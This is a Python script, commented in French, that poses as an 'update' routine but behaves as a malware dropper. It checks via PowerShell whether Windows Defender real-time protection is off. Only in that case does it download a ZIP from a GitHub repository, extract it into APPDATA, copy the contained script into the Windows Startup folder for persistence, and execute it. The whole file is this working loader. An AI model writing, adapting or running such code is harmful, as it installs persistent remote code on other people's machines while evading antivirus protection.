import subprocess
import sys
import os
import time
import psutil
import requests
import zipfile
import shutil

# ===============================
# PROTECTION CONTRE DOUBLE LANCEMENT
# ===============================
def already_running():
    print("[LOG] Vérification double lancement...")
    current_process = psutil.Process()
    for proc in psutil.process_iter(['pid', 'exe']):
        try:
            if proc.info['exe'] == current_process.exe() and proc.pid != current_process.pid:
                print("[LOG] Une autre instance est déjà en cours.")
                return True
        except:
            continue
    print("[LOG] Aucune autre instance détectée.")
    return False

# ===============================
# RÉCUPÉRER LE CHEMIN DU STARTUP
# ===============================
def get_startup_path():
    return os.path.join(
        os.getenv("APPDATA"),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )

# ===============================
# ✅ VÉRIFIER SI UPDATE DÉJÀ INSTALLÉE (CORRIGÉ)
# ===============================
def update_already_done():
    appdata = os.getenv("APPDATA")
    installed_file = os.path.join(
        appdata,
        "UPDATE",
        "UPDATE-main",
        "testup.py"
    )

    print("[LOG] Vérification présence du fichier installé...")
    print(f"[LOG] Chemin vérifié : {installed_file}")

    if os.path.exists(installed_file):
        print("[LOG] Update déjà installée → arrêt.")
        return True

    print("[LOG] Update non installée.")
    return False

# ===============================
# VÉRIFICATION PROTECTION DEFENDER
# ===============================
def is_protection_active():
    print("[LOG] Vérification de la protection Windows Defender...")
    try:
        result = subprocess.run(
            ["powershell", "-Command", "(Get-MpComputerStatus).RealTimeProtectionEnabled"],
            capture_output=True,
            text=True
        )
        status = result.stdout.strip().lower()
        print(f"[LOG] Résultat PowerShell : {status}")
        return status == "true"
    except Exception as e:
        print("[ERREUR] Impossible de vérifier Defender :", e)
        return False

# ===============================
# TÉLÉCHARGER, EXTRAIRE, COPIER DANS STARTUP ET EXÉCUTER
# ===============================
def action_if_disabled():
    print("[LOG] Protection désactivée → action déclenchée")

    github_zip_url = "https://github.com/ablookup/UPDATE/archive/refs/heads/main.zip"
    appdata = os.getenv("APPDATA")
    zip_path = os.path.join(appdata, "update.zip")
    extract_path = os.path.join(appdata, "UPDATE")
    script_inside_zip = os.path.join(extract_path, "UPDATE-main", "testup.py")
    startup_file = os.path.join(get_startup_path(), "testup.py")

    try:
        print("[LOG] Téléchargement du ZIP...")
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(github_zip_url, headers=headers)
        if r.status_code != 200:
            print("[ERREUR] Téléchargement échoué :", r.status_code)
            return

        with open(zip_path, "wb") as f:
            f.write(r.content)
        print("[LOG] ZIP téléchargé.")

        print("[LOG] Extraction...")
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            zip_ref.extractall(extract_path)
        os.remove(zip_path)
        print("[LOG] ZIP supprimé après extraction.")

        if not os.path.exists(startup_file):
            shutil.copy(script_inside_zip, startup_file)
            print(f"[LOG] Script copié dans Startup : {startup_file}")
        else:
            print("[LOG] Script déjà présent dans Startup.")

        if os.path.exists(script_inside_zip):
            print("[LOG] Exécution du script extrait...")
            subprocess.run(["python", script_inside_zip], check=False)
            print("[LOG] Exécution terminée.")
        else:
            print("[ERREUR] Script introuvable :", script_inside_zip)

    except Exception as e:
        print("[ERREUR] Problème pendant l'update :", e)

# ===============================
# PROGRAMME PRINCIPAL
# ===============================
if __name__ == "__main__":
    print("[LOG] Programme démarré.")

    if already_running():
        sys.exit(0)

    if update_already_done():
        sys.exit(0)

    time.sleep(2)

    if not is_protection_active():
        action_if_disabled()
    else:
        print("[LOG] Protection active → aucune action.")

    print("[LOG] Fin du programme.")
